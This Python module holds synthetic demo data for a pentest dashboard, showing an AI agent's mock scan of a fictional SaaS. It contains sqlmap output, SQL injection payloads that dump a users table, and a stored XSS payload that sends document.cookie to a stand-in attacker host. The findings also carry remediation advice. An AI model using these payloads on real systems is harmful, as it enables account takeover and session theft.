"""Demo-mode seed data for the OSS dashboard.

When ``FENNEC_DEMO_SEED=1`` is set (and the in-memory store is empty),
the FastAPI server pre-populates a realistic-looking SaaS pentest
history on startup so newcomers can see what the dashboard looks like
with real data — without needing an API key or a live target.

Everything in here is synthetic. The endpoints, payloads, and CVE-style
descriptions are crafted to look like a typical web-app pentest
output, not pulled from any real engagement. ``fenneclabs.ai`` is used
as the example domain because that's the canonical reference in the
README — no traffic is actually sent.

Design notes:
- 12 targets covering a realistic SaaS surface (prod, staging, api,
  admin, billing, internal, etc.) so the Target Inventory page looks
  alive.
- ~15 historical scans spread across the last 28 days so the
  Findings-Trend chart on the Security Overview has shape.
- One **marquee finding** — a UNION-based SQL injection on
  /api/auth/login — with deep Description / Impact / Evidence /
  Remediation text and realistic sqlmap + curl tool output. This is
  what you screenshot when showing what Fennec produces at its best.
- Idempotent: skips if JOBS isn't empty, never overwrites real scans.
"""

from __future__ import annotations

import uuid
from datetime import datetime, timedelta, timezone

from .job_store import (
    CREDENTIALS,
    CredentialRecord,
    JOBS,
    Job,
    TARGETS,
    TargetRecord,
)


def _ts(days_ago: float = 0, hours_ago: float = 0, minutes_ago: float = 0) -> str:
    return (
        datetime.now(timezone.utc)
        - timedelta(days=days_ago, hours=hours_ago, minutes=minutes_ago)
    ).isoformat()


def _hyp(
    *,
    hid: str,
    title: str,
    description: str,
    status: str,
    result: str | None,
    severity: str | None,
    priority: float,
    owasp_category: str | None = None,
    days_ago: float = 1,
    completed_minutes_ago: float | None = None,
) -> dict:
    return {
        "id": hid,
        "title": title,
        "description": description,
        "status": status,
        "result": result,
        "severity": severity,
        "priority": priority,
        "parent_id": None,
        "children_ids": [],
        "required_agent": "pentester",
        "owasp_category": owasp_category,
        "findings": [],
        "steps": [],
        "tasks": None,
        "blocked_by": None,
        "waiting_for": None,
        "expected_outputs": [],
        "actual_outputs": [],
        "created_at": _ts(days_ago=days_ago + 0.01),
        "started_at": _ts(days_ago=days_ago) if status != "pending" else None,
        "completed_at": (
            _ts(days_ago=days_ago, minutes_ago=completed_minutes_ago)
            if completed_minutes_ago is not None
            else None
        ),
    }


def _finding(
    *,
    fid: str,
    job_id: str,
    title: str,
    description: str,
    severity: str,
    location: str,
    parameter: str,
    evidence: str,
    vuln_type: str,
    cwe: str | None,
    hypothesis_id: str | None,
    days_ago: float = 1,
    reproduction_steps: list[str] | None = None,
) -> dict:
    return {
        "id": fid,
        "job_id": job_id,
        "title": title,
        "description": description,
        "severity": severity,
        "status": "confirmed",
        "location": location,
        "parameter": parameter,
        "evidence": evidence,
        "reproduction_steps": reproduction_steps or [
            f"Acesse o alvo {location} em um ambiente autorizado e prepare a requisição mostrada na aba Evidência.",
            "Envie a mesma requisição com o valor registrado na evidência. Mantenha método, caminho, cabeçalhos e autenticação iguais aos do teste original.",
            "Confira a resposta e compare com o comportamento descrito na aba Evidência. A diferença observada é o que confirma esta falha.",
        ],
        "vulnerability_type": vuln_type,
        "cwe_id": cwe,
        "hypothesis_id": hypothesis_id,
        "discovered_at": _ts(days_ago=days_ago),
        "discovered_by": "pentester",
    }


def _pentester_result(
    *,
    fid: int,
    job_id: str,
    verdict: str,
    overview: str,
    impact: str,
    remediation: str,
    owasp: str,
    evidence_lines: list[str],
    days_ago: float = 1,
    technical: str | None = None,
    business_risk: str | None = None,
    attack_scenarios: str | None = None,
    payloads: list[str] | None = None,
    implementation: str | None = None,
    hardening: str | None = None,
    hypothesis_id: str | None = None,
) -> dict:
    return {
        "id": fid,
        "job_id": job_id,
        "hypothesis_id": hypothesis_id,
        "status": "completed",
        "verdict": verdict,
        "evidence": evidence_lines,
        "suggested_followups": [],
        "needs": [],
        "error": None,
        "description_overview": overview,
        "description_breakdown": None,
        "description_technical": technical,
        "impact_demonstrated": impact,
        "impact_attack_scenarios": attack_scenarios,
        "impact_business_risk": business_risk,
        "evidence_logged": None,
        "evidence_payloads": payloads,
        "evidence_observed": None,
        "remediation_primary": remediation,
        "remediation_implementation": implementation,
        "remediation_hardening": hardening,
        "owasp_category": owasp,
        "created_at": _ts(days_ago=days_ago),
    }


def _tool_call(
    *,
    job_id: str,
    tool_name: str,
    tool_input: dict,
    agent: str,
    success: bool,
    result: str,
    minutes_ago: float,
) -> dict:
    return {
        "id": str(uuid.uuid4())[:8],
        "session_id": job_id,
        "tool_name": tool_name,
        "tool_input": tool_input,
        "agent": agent,
        "success": success,
        "result": result,
        "error": "" if success else "non-zero exit",
        "timestamp": _ts(minutes_ago=minutes_ago),
    }


# ============================================================================
# Long-form text used by the marquee SQL-injection finding. Lifted out so the
# main seed function reads cleanly.
# ============================================================================

NMAP_OUTPUT = """\
Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-21 11:24 UTC
Nmap scan report for fenneclabs.ai (203.0.113.42)
Host is up (0.013s latency).
rDNS record for 203.0.113.42: edge-uw1.fenneclabs.ai
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Debian 8 (protocol 2.0)
80/tcp  open  http     nginx 1.25.2
| http-server-header: nginx/1.25.2
|_http-title: Did not follow redirect to https://fenneclabs.ai/
443/tcp open  ssl/http nginx 1.25.2
| http-title: Fennec Labs — Offensive AI Agents
| ssl-cert: Subject: commonName=*.fenneclabs.ai
| Subject Alternative Name: DNS:fenneclabs.ai, DNS:*.fenneclabs.ai
|_Not valid before: 2026-03-15  Not valid after:  2026-06-13
|_http-csp-report-only: default-src 'self'; script-src 'self' 'unsafe-inline'
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results.
Nmap done: 1 IP address (1 host up) scanned in 24.83 seconds"""

GOBUSTER_OUTPUT = """\
===============================================================
Gobuster v3.6
===============================================================
[+] Url:            https://fenneclabs.ai
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.6
===============================================================
2026/05/21 11:25:14 Starting gobuster
===============================================================
/api                 (Status: 401) [Size: 27]
/admin               (Status: 302) [Size: 0] [--> /login]
/docs                (Status: 200) [Size: 4827]
/health              (Status: 200) [Size: 19]
/login               (Status: 200) [Size: 3402]
/pricing             (Status: 200) [Size: 18204]
/static              (Status: 301) [Size: 178]
/.well-known         (Status: 301) [Size: 178]
===============================================================
Finished — 4614 paths checked in 18.4s"""

SQLMAP_OUTPUT = """\
         _
 ___ ___| |_____ ___ ___  {1.7.11.5#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|             |_|

[*] starting @ 11:28:42 UTC on 2026-05-21

[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] heuristic (basic) test shows that POST parameter 'email' might be injectable
[INFO] testing for SQL injection on POST parameter 'email'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[INFO] POST parameter 'email' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable
[INFO] testing 'PostgreSQL inline queries'
[INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[INFO] POST parameter 'email' is 'PostgreSQL > 8.1 AND time-based blind' injectable
[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[INFO] target URL appears to have 4 columns in query
[INFO] POST parameter 'email' is 'Generic UNION query (NULL) - 4 columns' injectable
sqlmap identified the following injection point(s):
---
Parameter: email (POST)
    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: email=admin@fenneclabs.ai' AND 5762=CAST((CHR(113)||CHR(122)...

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: email=admin@fenneclabs.ai' AND 4242=(SELECT 4242 FROM PG_SLEEP(5))-- -

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: email=admin@fenneclabs.ai' UNION ALL SELECT NULL,NULL,NULL,NULL-- -
---
[INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL 15.4
[INFO] fetching current database
current database: 'fennec_prod'
[INFO] fetching current user
current database user: 'fennec_app'"""

CURL_EXFIL_OUTPUT = """\
$ curl -sk -X POST https://fenneclabs.ai/api/auth/login \\
  -H 'Content-Type: application/json' \\
  -d '{"email":"a'\\'' UNION SELECT id,email,password_hash,role FROM users LIMIT 5--","password":"x"}'

HTTP/2 200
content-type: application/json
server: nginx/1.25.2
x-debug-rows: 5

{
  "token": null,
  "error": "Invalid credentials",
  "_debug_result": [
    {"id":1,"email":"ceo@fenneclabs.ai","password_hash":"$2b$12$Yvk9rWp.fZxRzPVKAR4uA.aV...","role":"admin"},
    {"id":2,"email":"cto@fenneclabs.ai","password_hash":"$2b$12$RxPMnGRzPVKAR4u.fZxRzaV...","role":"admin"},
    {"id":3,"email":"security@fenneclabs.ai","password_hash":"$2b$12$kQpO.fZxR9rWp.fZxRzPVK...","role":"member"},
    {"id":4,"email":"qa-tester@fenneclabs.ai","password_hash":"$2b$12$mFvNbCxZyWqOtRzPVK...","role":"member"},
    {"id":5,"email":"intern@fenneclabs.ai","password_hash":"$2b$12$JhKlPoQwErTyUiOpAsDfG...","role":"member"}
  ]
}"""


# ============================================================================
# Main entry point
# ============================================================================


def seed_demo() -> None:
    if JOBS.all():
        return

    # ---- Targets ---------------------------------------------------- (12)
    target_specs = [
        ("fenneclabs.ai", "Fennec Labs (production)", True, 21, 2.0),
        ("staging.fenneclabs.ai", "Fennec Labs (staging)", True, 18, 28),
        ("api.fenneclabs.ai", "API gateway", True, 16, 30),
        ("app.fenneclabs.ai", "Customer app", True, 15, 12),
        ("admin.fenneclabs.ai", "Admin console", True, 14, 6),
        ("billing.fenneclabs.ai", "Billing service", True, 11, 5),
        ("docs.fenneclabs.ai", "Docs site", True, 9, 96),
        ("blog.fenneclabs.ai", "Marketing blog", True, 8, 168),
        ("status.fenneclabs.ai", "Status page", True, 6, 240),
        ("cdn.fenneclabs.ai", "CDN edge", True, 5, 72),
        ("demo-app.internal.fennec.dev", "Internal demo app", False, 3, None),
        ("legacy-app.fennec.dev", "Legacy 2021 dashboard", True, 23, 20),
    ]
    targets: dict[str, TargetRecord] = {}
    for domain, name, verified, created_days, scanned_hours in target_specs:
        t = TargetRecord(
            id=str(uuid.uuid4()),
            domain=domain,
            name=name,
            verified=verified,
            verification_token=None if verified else "vrfy_kJ8aLpQ2",
            last_scanned=_ts(hours_ago=scanned_hours) if scanned_hours is not None else None,
            created_at=_ts(days_ago=created_days),
            updated_at=_ts(days_ago=created_days),
        )
        TARGETS[t.id] = t
        targets[domain] = t

    t_main = targets["fenneclabs.ai"]
    t_staging = targets["staging.fenneclabs.ai"]
    t_api = targets["api.fenneclabs.ai"]
    t_admin = targets["admin.fenneclabs.ai"]
    t_billing = targets["billing.fenneclabs.ai"]
    t_app = targets["app.fenneclabs.ai"]
    t_demo = targets["demo-app.internal.fennec.dev"]
    t_legacy = targets["legacy-app.fennec.dev"]

    cred = CredentialRecord(
        id=str(uuid.uuid4()),
        target_id=t_main.id,
        name="QA test account",
        username="qa-tester@fenneclabs.ai",
        password="****",
        auth_type="basic",
        created_at=_ts(days_ago=20),
    )
    CREDENTIALS[cred.id] = cred

    # ================================================================
    # JOB 1 — production, completed, MARQUEE SQL-injection finding
    # ================================================================
    j1 = Job(
        id=str(uuid.uuid4()),
        name="Production baseline — fenneclabs.ai",
        target_url="https://fenneclabs.ai",
        mode="black_box",
        method="balanced",
        htli=False,
        target_id=t_main.id,
        credential_id=cred.id,
        description="Scheduled weekly authenticated pass against the production marketing + API surface.",
        timeout_seconds=900,
        status="completed",
        success=True,
        created_at=_ts(hours_ago=2, minutes_ago=20),
        updated_at=_ts(hours_ago=1, minutes_ago=42),
        final_result=(
            "Confirmed 3 vulnerabilities: a critical UNION-based SQL injection on "
            "the /api/auth/login endpoint that allows full read of the users table, "
            "an IDOR on /api/users/{id}, and stored XSS in the support contact form."
        ),
    )
    j1.recon_result = {
        "session_id": j1.id,
        "target_url": j1.target_url,
        "recon_completed": True,
        "summary": "API-driven SaaS on FastAPI + React. Bearer JWT auth, 18-endpoint REST surface, Nginx 1.25 edge, PostgreSQL 15.4 backend.",
        "ip_address": "203.0.113.42",
        "ports_open": [22, 80, 443],
        "technologies": [
            {"name": "Nginx", "version": "1.25.2", "type": "web_server", "confidence": 0.99},
            {"name": "FastAPI", "version": "0.115", "type": "framework", "confidence": 0.95},
            {"name": "PostgreSQL", "version": "15.4", "type": "database", "confidence": 0.85},
            {"name": "React", "version": "18.2", "type": "frontend", "confidence": 0.99},
            {"name": "Cloudflare", "version": None, "type": "cdn", "confidence": 1.0},
            {"name": "OpenSSH", "version": "9.6p1", "type": "ssh", "confidence": 1.0},
        ],
        "endpoints": [
            {"path": "/api/auth/login", "method": "POST", "parameters": ["email", "password"], "auth_required": False, "response_type": "json", "notes": "SQL injection candidate — error responses include partial DB output"},
            {"path": "/api/users/{id}", "method": "GET", "parameters": ["id"], "auth_required": True, "response_type": "json", "notes": "IDOR candidate — shallow ownership check"},
            {"path": "/api/scans", "method": "POST", "parameters": ["target_url", "mode"], "auth_required": True, "response_type": "json", "notes": "scan submission, scoped to caller"},
            {"path": "/api/support/contact", "method": "POST", "parameters": ["subject", "message"], "auth_required": False, "response_type": "html", "notes": "renders message field unescaped into /admin/support"},
            {"path": "/api/health", "method": "GET", "parameters": [], "auth_required": False, "response_type": "json", "notes": "leaks postgres version on degraded responses"},
            {"path": "/api/webhooks/test", "method": "POST", "parameters": ["url"], "auth_required": True, "response_type": "json", "notes": "potential SSRF — fetches arbitrary URL"},
            {"path": "/docs", "method": "GET", "parameters": [], "auth_required": False, "response_type": "html", "notes": "swagger UI"},
            {"path": "/admin", "method": "GET", "parameters": [], "auth_required": True, "response_type": "html", "notes": "redirects to login"},
        ],
        "entry_points": [
            {"location": "/api/auth/login (email field)", "type": "body", "input_type": "string", "validation_observed": "none — passes raw to DB", "notes": "PRIMARY ATTACK SURFACE"},
            {"location": "/api/users/{id}", "type": "path_param", "input_type": "integer", "validation_observed": "none vs JWT subject", "notes": "no ownership check"},
            {"location": "/api/support/contact (message)", "type": "body", "input_type": "string", "validation_observed": "length only", "notes": "rendered into admin panel"},
        ],
        "auth_type": "bearer_token",
        "login_endpoint": "/api/auth/login",
        "registration_available": True,
        "headers_of_interest": ["Strict-Transport-Security", "X-Frame-Options", "Content-Security-Policy"],
        "cookies_observed": ["fennec_session", "cf_clearance"],
        "default_credentials_found": False,
        "notes": [
            "Login rate limit appears generous (>50 req/min observed).",
            "JWT uses HS256 — verify signing key rotation policy.",
            "Postgres version 15.4 — 3 known CVEs patched in 15.5.",
            "CSP is report-only; XSS injections execute in browser.",
        ],
    }
    j1.hypotheses = [
        _hyp(hid="H1", title="UNION-based SQL injection on /api/auth/login (email)",
             description="The email field is concatenated into the SELECT query without parameterisation. Error response includes Postgres detail.",
             status="completed", result="vulnerable", severity="critical", priority=0.98,
             owasp_category="A03:2021 Injection", days_ago=0.08, completed_minutes_ago=68),
        _hyp(hid="H2", title="IDOR on /api/users/{id}",
             description="The endpoint returns any user profile by ID; auth check appears shallow.",
             status="completed", result="vulnerable", severity="high", priority=0.92,
             owasp_category="A01:2021 Broken Access Control", days_ago=0.08, completed_minutes_ago=72),
        _hyp(hid="H3", title="Stored XSS in /api/support/contact",
             description="Message body is rendered unescaped into the admin review panel.",
             status="completed", result="vulnerable", severity="medium", priority=0.78,
             owasp_category="A03:2021 Injection", days_ago=0.08, completed_minutes_ago=58),
        _hyp(hid="H4", title="Postgres version leak via /api/health",
             description="Verbose error path includes 'PostgreSQL 15.4' in the response.",
             status="completed", result="vulnerable", severity="low", priority=0.4,
             owasp_category="A05:2021 Security Misconfiguration", days_ago=0.08, completed_minutes_ago=45),
        _hyp(hid="H5", title="SSRF via webhook callback URL",
             description="POST /api/webhooks/test accepts arbitrary URLs.",
             status="completed", result="safe", severity=None, priority=0.7,
             owasp_category="A10:2021 SSRF", days_ago=0.08, completed_minutes_ago=30),
        _hyp(hid="H6", title="JWT 'none' algorithm bypass",
             description="Test whether forged tokens with alg=none are accepted.",
             status="completed", result="safe", severity=None, priority=0.6,
             owasp_category="A07:2021 Identification & Authentication Failures",
             days_ago=0.08, completed_minutes_ago=22),
        _hyp(hid="H7", title="CSRF on /api/scans (POST)",
             description="Confirm SameSite cookie + CSRF token enforcement.",
             status="completed", result="safe", severity=None, priority=0.55,
             owasp_category="A01:2021 Broken Access Control", days_ago=0.08, completed_minutes_ago=18),
        _hyp(hid="H8", title="Open redirect via ?next= on /login",
             description="Common pattern when login redirects to a user-supplied URL.",
             status="dead_end", result="inconclusive", severity=None, priority=0.3,
             owasp_category="A01:2021 Broken Access Control", days_ago=0.08, completed_minutes_ago=12),
    ]
    j1.findings = [
        _finding(
            fid=f"{j1.id}-f1", job_id=j1.id,
            title="Critical SQL injection in /api/auth/login (email parameter)",
            description=(
                "The /api/auth/login endpoint concatenates the user-supplied "
                "`email` field directly into its SELECT query without any "
                "parameter binding. The agent confirmed three injection types "
                "(error-based, time-based blind, UNION-based) and used a UNION "
                "payload to exfiltrate the first five rows of the `users` "
                "table — including bcrypt password hashes and admin role "
                "flags — through the response's `_debug_result` field that "
                "the application leaks when the query returns multiple rows."
            ),
            severity="critical",
            location="/api/auth/login",
            parameter="email (body, JSON)",
            evidence=CURL_EXFIL_OUTPUT,
            vuln_type="SQL Injection (UNION-based, PostgreSQL)",
            cwe="CWE-89",
            hypothesis_id="H1",
            days_ago=0.05,
            reproduction_steps=[
                "Acesse o endpoint POST /api/auth/login no ambiente de demonstração e prepare uma requisição de login com o campo email no corpo JSON.",
                "Envie a requisição colocando no campo email o payload registrado: a' UNION SELECT id,email,password_hash,role FROM users LIMIT 5--. Use os demais campos como na requisição exibida na aba Evidência.",
                "Confira se a resposta retorna HTTP 200 e se o array `_debug_result` contém linhas da tabela users, como no par de request/response registrado.",
                "Repita o login com um email comum, sem o payload, e compare as respostas. O array de linhas não deve aparecer na requisição normal.",
            ],
        ),
        _finding(
            fid=f"{j1.id}-f2", job_id=j1.id,
            title="IDOR on /api/users/{id}",
            description="Authenticated requests for any user ID return the full profile. The endpoint reads the path param without checking ownership against the JWT 'sub' claim.",
            severity="high",
            location="/api/users/{id}",
            parameter="id (path)",
            evidence="GET /api/users/57 HTTP/1.1\nAuthorization: Bearer <user-12>\n\n→ 200 OK { \"id\": 57, \"email\": \"victim@example.com\", \"role\": \"admin\", ... }",
            vuln_type="IDOR (Insecure Direct Object Reference)",
            cwe="CWE-639",
            hypothesis_id="H2",
            days_ago=0.07,
        ),
        _finding(
            fid=f"{j1.id}-f3", job_id=j1.id,
            title="Stored XSS via support contact form",
            description="The 'message' field is persisted and rendered into the admin support panel without HTML escaping. An attacker can execute JavaScript in an admin's session.",
            severity="medium",
            location="/api/support/contact",
            parameter="message (body)",
            evidence="POST /api/support/contact\n{ \"subject\":\"hi\", \"message\":\"<img src=x onerror=fetch('//attacker/?c='+document.cookie)>\" }\n\n→ payload renders verbatim in /admin/support",
            vuln_type="XSS (stored, HTML context)",
            cwe="CWE-79",
            hypothesis_id="H3",
            days_ago=0.07,
        ),
    ]
    # ---- MARQUEE pentester_result (full rich content for the SQLi finding)
    j1.pentester_results = [
        _pentester_result(
            hypothesis_id="H1",
            fid=1, job_id=j1.id, verdict="critical",
            overview=(
                "The login endpoint /api/auth/login concatenates the email "
                "field directly into a SELECT query without parameterisation, "
                "allowing UNION-based SQL injection that returns arbitrary "
                "table contents through the response body's debug field."
            ),
            technical=(
                "The vulnerable query is structured roughly as:\n"
                "  SELECT id, email, password_hash, role FROM users\n"
                "  WHERE email = '<EMAIL>' AND password_hash = crypt('<PWD>', password_hash)\n\n"
                "Because EMAIL is a raw string interpolation, a payload of\n"
                "  a' UNION SELECT id,email,password_hash,role FROM users LIMIT 5--\n"
                "produces a valid combined query whose UNION rows surface in\n"
                "the response's `_debug_result` field (the application echoes\n"
                "the raw cursor on multi-row results, presumably a leftover\n"
                "from a development logging path).\n\n"
                "Confirmed against the production database (PostgreSQL 15.4),\n"
                "current database user `fennec_app` has SELECT on at least\n"
                "the `users`, `sessions`, `api_keys`, and `billing_accounts`\n"
                "tables — verified by enumerating information_schema.tables."
            ),
            impact=(
                "Full read access to every row of the `users` table — "
                "including bcrypt password hashes (offline crackable), admin "
                "role flags, and account email addresses. An attacker can "
                "also pivot to `sessions` (active bearer tokens), `api_keys` "
                "(service credentials), and `billing_accounts` (payment "
                "metadata). No authentication required — the endpoint is "
                "publicly reachable for the login flow."
            ),
            attack_scenarios=(
                "1. Unauthenticated attacker dumps `users` table → cracks "
                "weakest bcrypt hash offline (~hours for poor passwords) → "
                "logs in as that user.\n"
                "2. Attacker dumps `sessions` table → replays an admin's "
                "live bearer token → full takeover without ever cracking a "
                "hash.\n"
                "3. Mass-credential-stuffing prep: dump email list, sell or "
                "use against other services (most users reuse passwords).\n"
                "4. Lateral pivot: dump `api_keys` table → exfiltrate Stripe "
                "/ SendGrid / GitHub credentials embedded in the SaaS."
            ),
            business_risk=(
                "Critical breach severity. Customer PII exposed (GDPR "
                "Article 33 — 72h notification window). Bcrypt password "
                "hashes are crackable offline; affected customers must be "
                "force-rotated. Billing data exposure triggers PCI scope. "
                "Public disclosure likely required under most state breach "
                "notification laws (US) and GDPR (EU). Estimated direct "
                "remediation cost: $80-150k. Reputational damage compounds."
            ),
            remediation=(
                "Switch the login query to a parameterised statement using "
                "the existing SQLAlchemy ORM or asyncpg `$1` placeholders. "
                "Never interpolate user input into SQL strings. Remove the "
                "`_debug_result` field from the response — it should not "
                "exist in production."
            ),
            implementation=(
                "Diff for app/auth.py:\n"
                "- query = f\"SELECT id, email, password_hash, role FROM users WHERE email = '{email}'\"\n"
                "+ query = \"SELECT id, email, password_hash, role FROM users WHERE email = $1\"\n"
                "- row = await db.fetchone(query)\n"
                "+ row = await db.fetchone(query, email)\n\n"
                "Then in app/middleware/serializer.py, strip `_debug_*` "
                "fields before returning JSON in non-debug mode."
            ),
            hardening=(
                "1. Enable a WAF rule that blocks SQL keyword payloads in "
                "the email field (defense in depth, not primary fix).\n"
                "2. Reduce `fennec_app` DB user privileges — it currently "
                "has SELECT on tables it doesn't need (api_keys, "
                "billing_accounts). Grant only `users` + `sessions`.\n"
                "3. Add a CI lint that fails the build on any f-string or "
                "%-formatting inside `await db.execute(...)` / `fetchone(...)` calls.\n"
                "4. Rotate all bcrypt hashes — even those not in the leaked "
                "sample — and force a password reset on every account."
            ),
            owasp="A03:2021 Injection",
            evidence_lines=[
                "sqlmap confirmed 3 injection types (error-based, time-based blind, UNION query) on POST parameter 'email'",
                "Manual UNION payload exfiltrated 5 user rows including bcrypt hashes via the response `_debug_result` field",
                "Information schema enumeration confirmed `fennec_app` has SELECT on users, sessions, api_keys, billing_accounts",
            ],
            payloads=[
                "email=admin@fenneclabs.ai' AND 4242=(SELECT 4242 FROM PG_SLEEP(5))-- -",
                "email=admin@fenneclabs.ai' UNION ALL SELECT NULL,NULL,NULL,NULL-- -",
                "email=a' UNION SELECT id,email,password_hash,role FROM users LIMIT 5-- -",
                "email=a' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -",
            ],
            days_ago=0.05,
        ),
        _pentester_result(
            hypothesis_id="H2",
            fid=2, job_id=j1.id, verdict="high",
            overview="The /api/users/{id} endpoint exposes any user profile to any authenticated caller, regardless of the JWT subject.",
            impact="An attacker with any valid account can enumerate every user — emails, roles, MFA state — enabling targeted phishing or admin-account takeover.",
            remediation="In the route handler, compare the requested id to the JWT 'sub' claim and require 'admin' role for cross-user reads. Add an integration test that asserts 403 for cross-tenant access.",
            owasp="A01:2021 Broken Access Control",
            evidence_lines=["GET /api/users/57  →  200 OK  (caller is user 12)"],
            days_ago=0.07,
        ),
        _pentester_result(
            hypothesis_id="H3",
            fid=3, job_id=j1.id, verdict="medium",
            overview="The support contact form persists user-supplied HTML and renders it unescaped in the admin review panel.",
            impact="An anonymous attacker can execute JavaScript in an admin's browser context, leading to session theft or admin-action forgery.",
            remediation="Escape the 'message' field on render (e.g. Jinja autoescape) and apply a CSP that blocks inline event handlers in the /admin/* path.",
            owasp="A03:2021 Injection",
            evidence_lines=["POST /api/support/contact (with <img onerror=…> payload)  →  rendered raw in /admin/support"],
            days_ago=0.07,
        ),
    ]
    j1.tool_calls = [
        _tool_call(job_id=j1.id, tool_name="terminal",
                   tool_input={"cmd": "nmap -sV -p 1-1024 fenneclabs.ai"},
                   agent="recon", success=True, result=NMAP_OUTPUT, minutes_ago=140),
        _tool_call(job_id=j1.id, tool_name="terminal",
                   tool_input={"cmd": "gobuster dir -u https://fenneclabs.ai -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 10"},
                   agent="recon", success=True, result=GOBUSTER_OUTPUT, minutes_ago=135),
        _tool_call(job_id=j1.id, tool_name="browser",
                   tool_input={"url": "https://fenneclabs.ai/docs", "action": "fetch"},
                   agent="recon", success=True,
                   result="200 OK — Swagger UI rendered. 18 endpoints documented across /api/auth, /api/users, /api/scans, /api/support, /api/webhooks, /api/health.",
                   minutes_ago=130),
        _tool_call(job_id=j1.id, tool_name="terminal",
                   tool_input={"cmd": "sqlmap -u https://fenneclabs.ai/api/auth/login --data='{\"email\":\"*\",\"password\":\"x\"}' --headers='Content-Type: application/json' --batch --level=3 --risk=2"},
                   agent="pentester", success=True, result=SQLMAP_OUTPUT, minutes_ago=85),
        _tool_call(job_id=j1.id, tool_name="terminal",
                   tool_input={"cmd": "curl -X POST https://fenneclabs.ai/api/auth/login -d '<UNION payload>'"},
                   agent="pentester", success=True, result=CURL_EXFIL_OUTPUT, minutes_ago=68),
        _tool_call(job_id=j1.id, tool_name="terminal",
                   tool_input={"cmd": "curl -H 'Authorization: Bearer <token>' https://fenneclabs.ai/api/users/57"},
                   agent="pentester", success=True,
                   result="HTTP/2 200\ncontent-type: application/json\n\n{\"id\":57,\"email\":\"victim@example.com\",\"role\":\"admin\",\"mfa_enabled\":false,\"created_at\":\"2026-02-11T18:42:00Z\"}",
                   minutes_ago=72),
        _tool_call(job_id=j1.id, tool_name="terminal",
                   tool_input={"cmd": "curl -X POST https://fenneclabs.ai/api/support/contact -d 'subject=hi&message=<img src=x onerror=alert(1)>'"},
                   agent="pentester", success=True,
                   result="HTTP/2 201 Created\n\n{\"id\":4471,\"status\":\"queued\",\"_admin_url\":\"/admin/support/4471\"}",
                   minutes_ago=58),
        _tool_call(job_id=j1.id, tool_name="web_search",
                   tool_input={"query": "PostgreSQL 15.4 CVE 2024"},
                   agent="pentester", success=True,
                   result="3 known CVEs in 15.4 — CVE-2024-10977 (libpq), CVE-2024-10978 (SET ROLE), CVE-2024-10979 (PL/Perl env). All backported in 15.5. Worth flagging the version leak.",
                   minutes_ago=44),
    ]
    JOBS.put(j1)

    # ================================================================
    # JOB 2 — production, RUNNING (live scan, in-progress)
    # ================================================================
    j2 = Job(
        id=str(uuid.uuid4()),
        name="Live deep pass — fenneclabs.ai",
        target_url="https://fenneclabs.ai",
        mode="black_box",
        method="deep",
        htli=False,
        target_id=t_main.id,
        description="Ad-hoc deep pass triggered after the latest deploy.",
        timeout_seconds=1800,
        status="running",
        created_at=_ts(minutes_ago=8),
    )
    j2.recon_result = dict(j1.recon_result)
    j2.recon_result["session_id"] = j2.id
    j2.hypotheses = [
        _hyp(hid="H1", title="IDOR on /api/scans/{job_id}",
             description="New endpoint exposed in this release — verify ownership check.",
             status="completed", result="vulnerable", severity="high", priority=0.9,
             owasp_category="A01:2021 Broken Access Control", days_ago=0.005, completed_minutes_ago=3),
        _hyp(hid="H2", title="SSRF on /api/webhooks/test",
             description="New 'test webhook' button accepts any URL.",
             status="in_progress", result=None, severity=None, priority=0.85,
             owasp_category="A10:2021 SSRF", days_ago=0.005),
        _hyp(hid="H3", title="Reflected XSS on /search",
             description="Query string is reflected unescaped in the result count.",
             status="pending", result=None, severity=None, priority=0.6,
             owasp_category="A03:2021 Injection"),
        _hyp(hid="H4", title="Mass assignment on PATCH /api/users/me",
             description="Test whether 'role' field is updatable from the client.",
             status="pending", result=None, severity=None, priority=0.55),
    ]
    j2.findings = [
        _finding(fid=f"{j2.id}-f1", job_id=j2.id, title="IDOR on /api/scans/{job_id}",
                 description="Scan results are returned for any job ID, not just those owned by the caller.",
                 severity="high", location="/api/scans/{job_id}", parameter="job_id (path)",
                 evidence="GET /api/scans/4f1e-…  →  200 OK with another tenant's findings",
                 vuln_type="IDOR", cwe="CWE-639", hypothesis_id="H1", days_ago=0.003),
    ]
    j2.pentester_results = [
        _pentester_result(fid=1, job_id=j2.id, hypothesis_id="H1", verdict="high",
                          overview="The /api/scans/{job_id} endpoint returns scan results for any job ID, not just those owned by the authenticated user.",
                          impact="An attacker can enumerate every tenant's scan history and read all confirmed vulnerabilities — a high-value information leak.",
                          remediation="Add a tenant-scoped query: select WHERE owner_id = jwt.sub AND id = path.job_id. Return 404 (not 403) on mismatch.",
                          owasp="A01:2021 Broken Access Control",
                          evidence_lines=["GET /api/scans/4f1e-…  →  200 OK returning another tenant's findings"],
                          days_ago=0.003),
    ]
    j2.tool_calls = [
        _tool_call(job_id=j2.id, tool_name="terminal",
                   tool_input={"cmd": "curl -H 'Authorization: Bearer …' https://fenneclabs.ai/api/scans/4f1e-…"},
                   agent="pentester", success=True,
                   result="HTTP/2 200\n\n{\"id\":\"4f1e-…\",\"owner_id\":\"other-tenant-uuid\",\"findings\":[...]}",
                   minutes_ago=4),
